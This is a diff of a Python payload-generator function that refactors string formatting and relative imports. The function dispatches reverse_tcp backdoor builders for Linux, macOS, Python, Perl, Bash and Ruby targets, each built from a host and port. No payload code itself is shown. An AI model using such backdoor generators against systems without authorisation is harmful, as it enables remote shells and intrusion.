@@ -5,7 +5,7 @@ def process( data, HOST, PORT, logger=True):
 		from random import randint
 		from os import path
 		while True:
-			logfile = "%s." % str(randint(0, 999999999))
+			logfile = "{0}.".format(str(randint(0, 999999999)))
 			if not path.isfile(logfile):
 				break
 	else:
@@ -13,15 +13,15 @@ def process( data, HOST, PORT, logger=True):
 
 
 	if data == "linux/x86/reverse_tcp":
-		from backdoors.main import linx86reverse_tcp
+		from .backdoors.main import linx86reverse_tcp
 		extension = "elf"
 		logs = linx86reverse_tcp( HOST,PORT)
 	elif data == "osx/x86/reverse_tcp":
-		from backdoors.main import macosx86reverse_tcp
+		from .backdoors.main import macosx86reverse_tcp
 		extension = "macho"
 		logs = macosx86reverse_tcp( HOST,PORT)
 	elif data == "linux/x64/reverse_tcp":
-		from backdoors.main import linx64reverse_tcp
+		from .backdoors.main import linx64reverse_tcp
 		extension = "elf"
 		logs = linx64reverse_tcp( HOST,PORT)
 	#elif data == "osx/x64/reverse_tcp":
@@ -45,19 +45,19 @@ def process( data, HOST, PORT, logger=True):
 
 
 	elif data == "unix/python/reverse_tcp":
-		from backdoors.main import pyreverse_tcp
+		from .backdoors.main import pyreverse_tcp
 		extension = "py"
 		logs = pyreverse_tcp( HOST,PORT)
 	elif data == "unix/perl/reverse_tcp":
-		from backdoors.main import plreverse_tcp
+		from .backdoors.main import plreverse_tcp
 		extension = "pl"
 		logs = plreverse_tcp( HOST,PORT)
 	elif data == "unix/bash/reverse_tcp":
-		from backdoors.main import shreverse_tcp
+		from .backdoors.main import shreverse_tcp
 		extension = "sh"
 		logs = shreverse_tcp( HOST,PORT)
 	elif data == "unix/ruby/reverse_tcp":
-		from backdoors.main import rbreverse_tcp
+		from .backdoors.main import rbreverse_tcp
 		extension = "rb"
 		logs = rbreverse_tcp( HOST,PORT)
 
